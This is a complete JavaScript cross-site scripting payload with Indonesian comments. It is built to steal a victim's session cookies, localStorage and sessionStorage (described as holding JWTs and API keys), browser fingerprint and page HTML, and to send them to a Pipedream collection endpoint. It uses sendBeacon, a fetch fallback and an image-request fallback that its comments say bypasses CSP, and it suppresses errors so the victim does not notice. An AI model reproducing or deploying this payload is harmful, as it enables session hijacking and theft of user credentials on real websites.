(function () {
  // Config: Ganti URL ini dengan URL Pipedream kamu
  const ENDPOINT = "https://eozpb8qg2g763of.m.pipedream.net"; 

  try {
    const data = {
      // Informasi Environment
      url: location.href,
      cookie: document.cookie, // Target utama (Session Hijacking)
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      
      // Fingerprinting Tingkat Lanjut
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: screen.width,
        height: screen.height
      },
      
      // Storage Dump (Mencari JWT/API Keys tersembunyi)
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      
      // DOM Snapshot (Untuk melihat konteks halaman korban)
      html: document.documentElement.outerHTML.slice(0, 1000), // Ambil 1000 char pertama
      
      // Metadata
      ts: new Date().toISOString(),
      id: Math.random().toString(36).substring(2)
    };

    // --- METODE PENGIRIMAN (Stealth & Robust) ---

    // 1. Coba kirim pakai Beacon (Lebih reliable saat tab ditutup, sangat stealth)
    // Navigator.sendBeacon mengirim POST request secara asynchronous
    const blob = new Blob([JSON.stringify(data)], {type : 'application/json'});
    const sent = navigator.sendBeacon(ENDPOINT, blob);

    // 2. Jika Beacon gagal atau browser tua, gunakan Fetch
    if (!sent) {
        fetch(ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).catch(() => {
            // 3. NUCLEAR FALLBACK: Image GET (Bypass CSP connect-src)
            // Jika fetch diblokir firewall/CSP, kita paksa lewat tag Gambar
            // Note: Data html/storage mungkin terpotong karena batas panjang URL
            const queryParams = new URLSearchParams({
                id: data.id,
                url: data.url,
                cookie: data.cookie
            }).toString();
            
            new Image().src = `${ENDPOINT}/?${queryParams}`;
        });
    }

  } catch (e) {
    // Silent fail agar tidak ketahuan di console log korban
  }
})();
